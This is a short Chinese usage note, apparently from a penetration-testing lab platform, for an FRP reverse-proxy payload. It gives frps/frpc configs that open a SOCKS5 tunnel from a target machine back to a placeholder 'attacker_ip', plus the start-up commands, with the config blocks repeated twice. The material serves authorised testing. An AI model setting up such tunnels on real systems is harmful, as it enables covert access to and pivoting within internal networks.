## 📦 载荷使用说明：frpc.ini

该载荷文件主要配合 **FRP** 算子（攻击技法）使用。以下是详细的操作步骤和参数说明。

### 📝 操作步骤

1. **准备阶段**：将本载荷文件通过系统的文件管理功能或光盘摆渡方式上传至目标虚拟机或宿主机指定目录。
2. **执行阶段**：在目标环境中调用 `FRP` 算子，并指定本载荷文件作为配置或脚本输入。
3. **结果验证**：观察执行日志，确认算子执行成功，并根据返回结果进行下一步渗透测试策略的制定。

### ⚙️ 参数说明

以下是本载荷涉及的核心参数及其含义（请根据实际隔离网络环境进行修改）：

**配置示例 1**：
```bash
[common]
bind_port = 7000
token = your_token
```

**配置示例 2**：
```bash
[common]
server_addr = attacker_ip
server_port = 7000
token = your_token

[socks5]
type = tcp
remote_port = 1080
plugin = socks5
```

**配置示例 3**：
```bash
# 攻击机启动服务端
./frps -c frps.ini

# 目标机启动客户端
./frpc -c frpc.ini
```

### 📖 原始工具说明

以下是系统内置的原始工具说明，供参考：

## FRP 内网穿透反向代理

### 服务端配置 (frps.ini)
```ini
[common]
bind_port = 7000
token = your_token
```

### 客户端配置 (frpc.ini)
```ini
[common]
server_addr = attacker_ip
server_port = 7000
token = your_token

[socks5]
type = tcp
remote_port = 1080
plugin = socks5
```

### 启动命令
```bash
# 攻击机启动服务端
./frps -c frps.ini

# 目标机启动客户端
./frpc -c frpc.ini
```

- ✓ 支持 TCP/UDP 穿透
- ✓ 支持 SOCKS5 代理
- ⚠ 需要公网服务器中转